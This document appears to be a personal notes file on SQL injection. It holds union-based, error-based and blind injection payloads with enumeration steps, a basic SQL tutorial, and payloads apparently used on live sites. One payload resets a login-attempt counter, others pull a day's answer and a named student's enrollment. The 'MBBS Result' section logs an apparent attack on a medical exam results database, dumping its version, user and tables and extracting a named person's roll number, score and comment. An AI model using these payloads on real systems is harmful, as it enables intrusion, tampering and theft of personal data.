**# Break the query (do fuzzing)** :

 	=> ?id=1' or ?id=1\\ or ?id=1"



**# Fix the query :**

 	=> broken query:  ''1\\') LIMIT 0,1'

 	   fix : ?id=1')--+



**# Get the column numbers in query :**

=> ?id=1' order by x --+ //keep incrementing x until breaks, the last number without breaking is the number of column used in query.



 	or, ?id=1' union select 1,2,3 AND '1

 

\# **Attack-sample** : ?id=-1' union select 1, user(), database() --+

 	=> **get table-names :** ?id=-1' union select 1, group\_concat(table\_name),3 from information\_schema.tables where table\_schema=database() --+ // **output** : emails,referers,uagents,users

 	=> **get column names** : ?id=-1' union select 1, group\_concat(column\_name),3 from information\_schema.columns where table\_name='users' --+ // **output** : id,username,password

 	=> **get user-names \& passwords** : ?id=-1' union select 1, group\_concat(username),group\_concat(password) from users --+

 	=> **alternative way :** ?id=-1' union select 1,user(),3 AND '1







**# Dump info through error :**

=> ?id=1' AND (select 1 from (select count(\*), concat(0x3a,0x3a,(select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),0x3a,0x3a, floor(rand()\*2))a from information\_schema.columns group by a)b) --+



**more options:**

select count(\*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()\*2))a from information\_schema.columns group by a;

select count(\*), concat(0x3a,0x3a,(select version()),0x3a,0x3a, floor(rand()\*2))a from information\_schema.columns group by a;

select count(\*), concat(0x3a,0x3a,(select user()),0x3a,0x3a, floor(rand()\*2))a from information\_schema.columns group by a;

select count(\*), concat(0x3a,0x3a,(select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),0x3a,0x3a, floor(rand()\*2))a from information\_schema.columns group by a;







**# Blind sql :**

=> ?id=1' AND (ascii(substr((select database()),1,1)) > 97) --+

=> ?id=1' AND (ascii(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1,1)) = 101) --+





**# Online:**



	payload1: admin' or '1'='1' -- 

&nbsp;	payload2: ' UNION SELECT secret\_key, null, null, null FROM hidden\_data-- 



&nbsp;	Payload 1: 2005033'; UPDATE users SET tries\_today=0 WHERE username='2005033' # a

&nbsp;	Payload 2: -1' UNION SELECT 1,2,(select word from answers where day='2025-07-13') # a





&nbsp;	' or '1'='1



&nbsp;	' UNION SELECT student\_name FROM enrollments -- 



&nbsp;	' and 1=(SELECT 1 FROM enrollments WHERE student\_name = 'Farriha Afnan'  AND course\_name='Database')--





**# Basic queries:** 



🔹 1. SELECT – Retrieve data



-- Get all columns from "users"

SELECT \* FROM users;



-- Get specific columns

SELECT name, email FROM users;



-- With a condition

SELECT name FROM users WHERE age > 25;



🔹 2. INSERT – Add new data



-- Insert into all columns

INSERT INTO users (name, email, age)

VALUES ('Rakesh', 'rakesh@email.com', 22);



🔹 3. UPDATE – Modify existing data



-- Change email of a user

UPDATE users

SET email = 'new@email.com'

WHERE name = 'Rakesh';



🔹 4. DELETE – Remove data



-- Delete a user

DELETE FROM users

WHERE name = 'Rakesh';



🔹 5. CREATE TABLE – Make a new table



CREATE TABLE users (

&nbsp;   id INT PRIMARY KEY,

&nbsp;   name VARCHAR(100),

&nbsp;   email VARCHAR(100),

&nbsp;   age INT

);



🔹 6. DROP TABLE – Delete the entire table



DROP TABLE users;



🔹 7. ALTER TABLE – Modify table structure



-- Add a column

ALTER TABLE users ADD COLUMN phone VARCHAR(15);



-- Rename a column (MySQL)

ALTER TABLE users RENAME COLUMN phone TO mobile;



-- Drop a column

ALTER TABLE users DROP COLUMN mobile;



🔹 8. WHERE – Filter rows



SELECT \* FROM users WHERE age < 30;



🔹 9. ORDER BY – Sort results



SELECT \* FROM users ORDER BY age DESC;



🔹 10. LIMIT – Restrict number of results (MySQL)



SELECT \* FROM users LIMIT 5;



🔹 11. JOIN – Combine rows from multiple tables

🧩 INNER JOIN (only matching rows)



SELECT users.name, orders.amount

FROM users

INNER JOIN orders ON users.id = orders.user\_id;



🧲 LEFT JOIN (all from left + matching from right)



SELECT users.name, orders.amount

FROM users

LEFT JOIN orders ON users.id = orders.user\_id;



🔹 12. GROUP BY \& Aggregates – Summary magic



-- Count users by age

SELECT age, COUNT(\*) as user\_count

FROM users

GROUP BY age;



🔹 13. HAVING – Conditions on groups



-- Get only age groups with more than 1 user

SELECT age, COUNT(\*) as user\_count

FROM users

GROUP BY age

HAVING COUNT(\*) > 1;



🔹 14. UNION – Combine results from multiple SELECTs



SELECT name FROM employees

UNION

SELECT name FROM managers;



🔹 15. Subquery – Query inside a query



SELECT name FROM users

WHERE age > (SELECT AVG(age) FROM users);



💡 Bonus: LIKE – Pattern matching



SELECT \* FROM users WHERE name LIKE 'Rak%';  -- Starts with "Rak"











**# MBBS Result :**



=> 1403836' -- #



=> 1403836' order by 14 -- # \[14 cols]



=> -1' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14 -- #  \[dumping seq - 3,5,10,11,4,13,14]



=> -1' union select 1,2,database(),4,version(),6,7,8,9,user(),current\_user,12,13,(select group\_concat(table\_name) from information\_schema.tables where table\_schema=database()) -- #



 	**output:**

 	\*\*database - resu\\\_mbbs\\\_result\*\*

 	\\\*\\\*version  - 10.5.12-MariaDB\\\*\\\*

&nbsp;	\\\\\\\*\\\\\\\*user     - resu\\\\\\\\\\\\\\\_mbbsdb\\\\\\\\\\\\\\\_user@localhost\\\\\\\*\\\\\\\*

		\\\\\\\*\\\\\\\*tables   - iht\\\\\\\\\\\\\\\_mats\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_21\\\\\\\\\\\\\\\_22,iht\\\\\\\\\\\\\\\_mats\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_23\\\\\\\\\\\\\\\_24,prgpwn,iht\\\\\\\\\\\\\\\_mats\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_22\\\\\\\\\\\\\\\_23,mbbs\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_23\\\\\\\\\\\\\\\_24,bds\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_23\\\\\\\\\\\\\\\_24,bds\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_24\\\\\\\\\\\\\\\_25,bds\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_20\\\\\\\\\\\\\\\_21,mbbs\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_18\\\\\\\\\\\\\\\_19,mbbs\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_19\\\\\\\\\\\\\\\_20,mbbs\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_19\\\\\\\\\\\\\\\_20\\\\\\\\\\\\\\\_old,mbbs\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_20\\\\\\\\\\\\\\\_21,mbbs\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_21\\\\\\\\\\\\\\\_22,bds\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_21\\\\\\\\\\\\\\\_22,iht\\\\\\\\\\\\\\\_mats\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_23\\\\\\\\\\\\\\\_24\\\\\\\\\\\\\\\_bbbb,bsc\\\\\\\\\\\\\\\_iht\\\\\\\\\\\\\\\_mats\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_23\\\\\\\\\\\\\\\_24,iht\\\\\\\\\\\\\\\_mats\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_24\\\\\\\\\\\\\\\_25,mbbs\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_24\\\\\\\\\\\\\\\_25,homeo\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_21\\\\\\\\\\\\\\\_22,mbbs\\\\\\\\\\\\\\\_result\\\\\\\\\\\\\\\_22\\\\\\\\\\\\\\\_23\\\\\\\*\\\\\\\*








**=>** -1' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,(select group\_concat(column\_name) from information\_schema.columns where table\_name='mbbs\_result\_20\_21') -- #



 	**columns :** auto\_id,user\_id\_new,roll,name,test\_score,merit\_score,merit\_position,college\_code,college,status,comment



=> -1' union select 1,2,(select roll from mbbs\_result\_20\_21 where name='Rakesh Debnath'),null,(select name from mbbs\_result\_20\_21 where name='Rakesh Debnath'),null,null,null,null,(select test\_score from mbbs\_result\_20\_21 where name='Rakesh Debnath'),null,12,(select comment from mbbs\_result\_20\_21 where name='Rakesh Debnath'), null -- #





















Databases that do support **information\_schema:**

✅ MySQL



✅ PostgreSQL



✅ SQL Server (partially; has its own system views too)



✅ MariaDB



✅ Amazon Redshift



Databases that don't (or use something different):

❌ Oracle — uses its own data dictionary views like USER\_TABLES, ALL\_TABLES, etc.



❌ SQLite — uses sqlite\_master instead



❌ MongoDB — not even relational; uses a completely different structure

